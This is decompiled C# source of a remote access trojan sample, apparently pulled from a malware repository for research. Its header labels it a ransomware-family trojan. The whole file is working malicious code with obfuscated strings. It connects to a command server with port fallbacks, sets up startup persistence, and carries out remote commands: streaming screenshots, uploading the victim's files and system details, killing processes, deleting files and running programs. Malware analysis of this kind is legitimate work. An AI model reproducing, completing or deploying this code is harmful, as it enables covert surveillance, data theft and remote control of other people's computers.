// Decompiled with JetBrains decompiler
// Type: thnaviwa.MACDM
// Assembly: thnaviwa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A6D437-741C-49E8-8392-5835C756DC2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-98894973a86aa01c4f7496ae339dc73b5e6da2f1dbcd5fe1215f70ea7b889b85.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace thnaviwa
{
  public class MACDM
  {
    public bool thnaviwais_working = false;
    private bool thnaviwaiswitch = false;
    public int port_sn = 0;
    private Dictionary<string, byte[]> thnaviwatasks = new Dictionary<string, byte[]>();
    private THRDE thnaviwaStateObj = new THRDE();
    private URYINF thnaviwaUPC;
    private OCRMD thnaviwaCMD;
    private int thnaviwascrSize = 200;
    private ThreadStart thnaviwafunStarter;
    public TcpClient thnaviwatcpsck;
    public DateTime thnaviwarunTime;
    private int thnaviwabytesRead = 0;
    public bool thnaviwareqCnls = false;
    public bool thnaviwaautCnls = false;
    public DateTime thnaviwalTimeUtc;
    public NetworkStream thnaviwanetStream;
    private int thnaviwabuffSize = 1024;
    private DIRINFO thnaviwaHD = new DIRINFO();
    private bool thnaviwathrRuning = false;
    private bool thnaviwastr_writer = false;
    private bool thnaviwacapScreen = false;
    private Thread thnaviwafunThread;

    public void thnaviwado_start()
    {
      this.thnaviwarunTime = DateTime.Now;
      this.thnaviwaUPC = new URYINF();
      this.thnaviwaCMD = new OCRMD(this);
      this.thnaviwaHD.iserver = this;
      this.thnaviwaHD.thnaviwamainPath = CONFIG.thnaviwaget_mpath();
      this.thnaviwaStateObj.thnaviwatimer = new System.Threading.Timer(new TimerCallback(this.thnaviwalookup_connect), (object) this.thnaviwaStateObj, 32110, 36110);
      if (Directory.Exists(CONFIG.thnaviwaget_mpath()))
        return;
      Directory.CreateDirectory(CONFIG.thnaviwaget_mpath());
    }

    public void thnaviwasaveFile(string filePath)
    {
      try
      {
        byte[] bytes = this.thnaviwapull_data();
        if (bytes == null)
          return;
        File.WriteAllBytes(filePath, bytes);
      }
      catch
      {
      }
    }

    private void thnaviwacheckLastatime(DateTime mTimeUtc)
    {
      try
      {
        if (Math.Abs(this.thnaviwarunTime.Subtract(mTimeUtc).Minutes) <= 5)
          return;
        this.thnaviwatcpsck.Close();
        this.thnaviwais_working = false;
      }
      catch
      {
      }
    }

    private bool thnaviwaIPSConfig()
    {
      try
      {
        CONFIG.thnaviwadefaultP = this.thnaviwaCMD.thnaviwaserverIPD();
        this.thnaviwatcpsck = new TcpClient();
        this.thnaviwatcpsck.Connect(CONFIG.thnaviwadefaultP, CONFIG.thnaviwaport);
        return true;
      }
      catch
      {
        this.thnaviwaports_switch();
        return false;
      }
    }

    public string thnaviwafile_info(string path, bool ret = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (ret)
          str1 = "<|thnaviwa".Split('|')[0];
        else
          str1 = ">|thnaviwa".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.Date.ToString();
        string str4;
        if (ret)
          str4 = "<|thnaviwa".Split('|')[0];
        else
          str4 = ">|thnaviwa".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string str6 = this.thnaviwaget_size(fileInfo.Length);
        string str7;
        if (ret)
          str7 = "<|thnaviwa".Split('|')[0];
        else
          str7 = ">|thnaviwa".Split('|')[0];
        string str8 = str5 + str6 + str7;
        if (!ret)
          this.thnaviwapush_data((byte[]) null, "thnaviwa-filsz=|thnaviwa".Split('|')[0] + str8);
        return str8;
      }
      catch
      {
        return "";
      }
    }

    public void thnaviwaports_switch()
    {
      ++this.port_sn;
      switch (this.port_sn)
      {
        case 0:
          CONFIG.thnaviwaport = CONFIG.port;
          break;
        case 1:
          CONFIG.thnaviwaport = CONFIG.aport;
          break;
        case 2:
          CONFIG.thnaviwaport = CONFIG.bport;
          break;
        case 3:
          CONFIG.thnaviwaport = CONFIG.cport;
          break;
        case 4:
          CONFIG.thnaviwaport = CONFIG.cport;
          break;
      }
      if (this.port_sn < 4)
        return;
      this.port_sn = 0;
    }

    public bool thnaviwasend_auto(string fileinfo)
    {
      try
      {
        string path = fileinfo.Split('>')[0];
        if (File.Exists(path))
        {
          string fileName = Path.GetFileName(path);
          byte[] data = File.ReadAllBytes(path);
          fileinfo = fileinfo + ">" + fileName;
          this.thnaviwapush_data(data, "thnaviwa-afile=" + fileinfo);
          return false;
        }
        this.thnaviwapush_data((byte[]) null, "thnaviwa-anfod=" + fileinfo);
        return false;
      }
      catch
      {
        return false;
      }
    }

    private void thnaviwalookup_connect(object sdource)
    {
      try
      {
        if (!this.thnaviwathrRuning)
        {
          this.thnaviwathrRuning = true;
          this.thnaviwacheckLastatime(DateTime.Now);
          if (!this.thnaviwais_working || !this.thnaviwatcpsck.Connected)
          {
            this.thnaviwais_working = this.thnaviwaIPSConfig();
            if (this.thnaviwais_working)
            {
              this.thnaviwabuffSize = this.thnaviwatcpsck.ReceiveBufferSize;
              this.thnaviwasee_responce();
            }
          }
        }
        this.thnaviwathrRuning = false;
      }
      catch
      {
        this.thnaviwathrRuning = false;
        this.thnaviwastr_writer = false;
        this.thnaviwais_working = false;
        this.thnaviwaiswitch = false;
      }
    }

    public void thnaviwaload_app()
    {
      try
      {
        string executablePath = Application.ExecutablePath;
        string path = CONFIG.thnaviwaget_mpath() + CONFIG.thnaviwamainApp + ".exe|thnaviwa".Split('|')[0];
        if (path != executablePath)
          File.WriteAllBytes(path, File.ReadAllBytes(executablePath));
        Thread.Sleep(10);
        CONFIG.thnaviwaset_run("_thnasr|thnaviwa".Split('|')[0], CONFIG.thnaviwaget_mpath() + CONFIG.thnaviwamainApp + ".exe|thnaviwa".Split('|')[0]);
      }
      catch
      {
      }
    }

    public void thnaviwalist_processes()
    {
      try
      {
        string str = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
          str = str + (object) processes[index].Id + ">|thnaviwa".Split('|')[0] + processes[index].ProcessName + ">|thnaviwa".Split('|')[0] + "0>|thnaviwa".Split('|')[0] + "<";
        this.thnaviwapush_data(CONFIG.getByteArray(str), "thnaviwa-procl=process|thnaviwa".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void thnaviwasee_scren(string screenSize)
    {
      try
      {
        WSCRNS wscrns = new WSCRNS();
        this.thnaviwascrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        Bitmap bitmap = wscrns.thnaviwascreen(this.thnaviwascrSize);
        if (bitmap == null)
          return;
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
        this.thnaviwapush_data(memoryStream.ToArray(), "thnaviwa-sascr=cacreen|thnaviwa".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void thnaviwaimage_info(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), new Size(200, 150));
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str1 = fileInfo.Name + ">|thnaviwa".Split('|')[0];
        DateTime dateTime = fileInfo.CreationTimeUtc;
        dateTime = dateTime.Date;
        string str2 = dateTime.ToString();
        string str3 = ">|thnaviwa".Split('|')[0];
        string str4 = str1 + str2 + str3 + this.thnaviwaget_size(fileInfo.Length) + ">";
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Gif);
        this.thnaviwapush_data(memoryStream.ToArray(), "thnaviwa-thumb=|thnaviwa".Split('|')[0] + str4);
      }
      catch
      {
      }
    }

    private void thnaviwauser_info() => this.thnaviwapush_data(CONFIG.getByteArray(this.thnaviwaUPC.thnaviwalancard + "|" + this.thnaviwaUPC.thnaviwacname + "|" + this.thnaviwaUPC.thnaviwauname + "|" + this.thnaviwaUPC.thnaviwauip + "|" + CONFIG.thnaviwaOsname() + "|" + this.thnaviwaUPC.thnaviwaapver + "|" + CONFIG.thnaviwaloadAV() + "| !thnaviwa".Split('!')[0] + "|" + this.thnaviwaUPC.thnaviwaclientNum + "|" + CONFIG.thnaviwaget_mpath()), "thnaviwa-info=user|thnaviwa".Split('|')[0]);

    private void thnaviwais_screen(string screenSize)
    {
      try
      {
        WSCRNS wscrns = new WSCRNS();
        this.thnaviwascrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        while (this.thnaviwacapScreen && this.thnaviwais_working)
        {
          Bitmap bitmap = wscrns.thnaviwascreen(this.thnaviwascrSize);
          if (bitmap != null)
          {
            MemoryStream memoryStream = new MemoryStream();
            bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
            this.thnaviwapush_data(memoryStream.ToArray(), "thnaviwa-scren=cacreen|thnaviwa".Split('|')[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void thnaviwascreenSize(string scSize)
    {
      try
      {
        this.thnaviwascrSize = (int) Convert.ToInt16(scSize.Split('>')[0].Trim());
      }
      catch
      {
      }
    }

    public void thnaviwaremove_file(string path)
    {
      try
      {
        File.Delete(path);
      }
      catch
      {
      }
    }

    private string thnaviwaget_size(long byteCount)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B|thnaviwa".Split('|')[0],
          "KB|thnaviwa".Split('|')[0],
          "MB|thnaviwa".Split('|')[0],
          "GB|thnaviwa".Split('|')[0],
          "TB|thnaviwa".Split('|')[0],
          "PB|thnaviwa".Split('|')[0],
          "EB|thnaviwa".Split('|')[0]
        };
        if (byteCount == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCount);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCount) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    private void thnaviwapush_file(string lfile)
    {
      try
      {
        if (!File.Exists(lfile))
          return;
        string fileName = Path.GetFileName(lfile);
        this.thnaviwapush_data(File.ReadAllBytes(lfile), "thnaviwa-file=|thnaviwa".Split('|')[0] + lfile + ">0>" + fileName, true);
      }
      catch
      {
      }
    }

    public string[] thnaviwaget_command()
    {
      try
      {
        byte[] buffer = new byte[5];
        this.thnaviwabytesRead = this.thnaviwanetStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.thnaviwabytesRead)
        {
          int count = index > this.thnaviwabuffSize ? this.thnaviwabuffSize : index;
          this.thnaviwabytesRead = this.thnaviwanetStream.Read(numArray, offset, count);
          offset += this.thnaviwabytesRead;
        }
        string str = Encoding.UTF8.GetString(numArray, 0, int32).ToString();
        if (str.Trim() == "")
          return (string[]) null;
        return str.Split('=');
      }
      catch
      {
        this.thnaviwais_working = false;
        return (string[]) null;
      }
    }

    private void thnaviwasee_responce()
    {
      if (!this.thnaviwaiswitch)
      {
        this.thnaviwaiswitch = true;
        this.thnaviwanetStream = this.thnaviwaCMD.thnaviwaNS(this.thnaviwatcpsck);
        this.thnaviwacapScreen = false;
        while (this.thnaviwais_working)
        {
          string[] switchType = this.thnaviwaget_command();
          if (switchType == null)
          {
            this.thnaviwais_working = false;
            break;
          }
          this.thnaviwareqCnls = false;
          string lower = switchType[0].ToLower();
          string str;
          if (lower.Split('-').Length > 1)
            str = "thnaviwa-" + lower.Split('-')[1];
          else
            str = "thnaviwa-" + lower;
          switch (str)
          {
            case "thnaviwa-procl":
              this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwalist_processes());
              this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-thumb":
              this.thnaviwaimage_info(switchType[1]);
              break;
            case "thnaviwa-clping":
              this.thnaviwarunTime = DateTime.Now;
              break;
            case "thnaviwa-putsrt":
              this.thnaviwaload_app();
              break;
            case "thnaviwa-filsz":
              this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwafile_info(switchType[1]));
              this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-rupth":
              this.thnaviwapush_data((byte[]) null, "thnaviwa-appth=|thnaviwa".Split('|')[0] + CONFIG.thnaviwaget_mpath());
              break;
            case "thnaviwa-dowf":
              this.thnaviwasaveFile(switchType[1]);
              break;
            case "thnaviwa-endpo":
              try
              {
                Thread.Sleep(100);
                Process.GetProcessById((int) Convert.ToInt16(switchType[1].Trim())).Kill();
                break;
              }
              catch
              {
                break;
              }
            case "thnaviwa-scrsz":
              this.thnaviwascreenSize(switchType[1]);
              break;
            case "thnaviwa-cscreen":
              this.thnaviwasee_scren(switchType[1]);
              break;
            case "thnaviwa-dirs":
              this.thnaviwafunThread = new Thread(new ThreadStart(this.thnaviwalistDrives));
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-stops":
              this.thnaviwacapScreen = false;
              break;
            case "thnaviwa-scren":
              this.thnaviwacapScreen = true;
              this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwais_screen(switchType[1]));
              this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-cnls":
              this.thnaviwaautCnls = true;
              this.thnaviwareqCnls = true;
              this.thnaviwacapScreen = false;
              break;
            case "thnaviwa-udlt":
              this.thnaviwaCMD.thnaviwaremove_user();
              break;
            case "thnaviwa-delt":
              this.thnaviwaremove_file(switchType[1]);
              break;
            case "thnaviwa-afile":
              this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwasend_auto(switchType[1]));
              this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-listf":
              this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwaHD.thnaviwalookFiles(switchType[1]));
              this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-file":
              this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwapush_file(switchType[1]));
              this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-info":
              this.thnaviwafunThread = new Thread(new ThreadStart(this.thnaviwauser_info));
              this.thnaviwafunThread.Start();
              break;
            case "thnaviwa-runf":
              this.thnaviwaCMD.thnaviwado_process(switchType[1].Split('>')[0]);
              break;
            case "thnaviwa-fles":
              string files = this.thnaviwaHD.thnaviwalookupFiles(switchType[1]);
              if (files != null)
              {
                this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwapush_data((byte[]) null, "thnaviwa-fles=|thnaviwa".Split('|')[0] + files));
                this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
                this.thnaviwafunThread.Start();
                break;
              }
              break;
            case "thnaviwa-dowr":
              this.thnaviwasaveFile(switchType[1]);
              break;
            case "thnaviwa-fldr":
              string Folders = this.thnaviwaHD.thnaviwacheckFolders(switchType[1]);
              if (Folders != null)
              {
                this.thnaviwafunStarter = (ThreadStart) (() => this.thnaviwapush_data((byte[]) null, "thnaviwa-fldr=|thnaviwa".Split('|')[0] + Folders));
                this.thnaviwafunThread = new Thread(this.thnaviwafunStarter);
                this.thnaviwafunThread.Start();
                break;
              }
              break;
          }
        }
        this.thnaviwais_working = false;
        this.thnaviwacapScreen = false;
      }
      this.thnaviwaiswitch = false;
    }

    private void thnaviwalistDrives() => this.thnaviwapush_data((byte[]) null, "thnaviwa-dirs=" + this.thnaviwaHD.thnaviwalookupDrives());

    public byte[] thnaviwapull_data()
    {
      try
      {
        this.thnaviwarunTime = DateTime.Now;
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.thnaviwabytesRead = this.thnaviwanetStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        int num = int32;
        while (num > 0 && !this.thnaviwareqCnls)
        {
          int count = num > this.thnaviwabuffSize ? this.thnaviwabuffSize : num;
          this.thnaviwabytesRead = this.thnaviwanetStream.Read(buffer2, offset, count);
          offset += this.thnaviwabytesRead;
          num -= this.thnaviwabytesRead;
          this.thnaviwarunTime = DateTime.Now;
        }
        if (this.thnaviwareqCnls)
        {
          this.thnaviwanetStream.Flush();
          do
            ;
          while (this.thnaviwanetStream.DataAvailable && this.thnaviwanetStream.ReadByte() >= 0);
          buffer2 = (byte[]) null;
        }
        return buffer2;
      }
      catch
      {
        this.thnaviwais_working = false;
        return (byte[]) null;
      }
    }

    public bool thnaviwapush_data(byte[] data, string type, bool tmp = false)
    {
      try
      {
        this.thnaviwarunTime = DateTime.Now;
        if (this.thnaviwastr_writer)
          return false;
        this.thnaviwastr_writer = true;
        byte[] byteArray = CONFIG.getByteArray(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(byteArray.Length);
        byte[] buffer = new byte[num2 + byteArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        byteArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + byteArray.Length);
          data.CopyTo((Array) buffer, 10 + byteArray.Length);
        }
        int offset = 0;
        int length = buffer.Length;
        while (length > 0 && !this.thnaviwareqCnls)
        {
          int count = length > this.thnaviwabuffSize ? this.thnaviwabuffSize : length;
          this.thnaviwanetStream.Write(buffer, offset, count);
          offset += count;
          length -= count;
          this.thnaviwarunTime = DateTime.Now;
        }
        this.thnaviwastr_writer = false;
        return !this.thnaviwareqCnls;
      }
      catch
      {
        this.thnaviwastr_writer = false;
        this.thnaviwais_working = false;
        return false;
      }
    }
  }
}
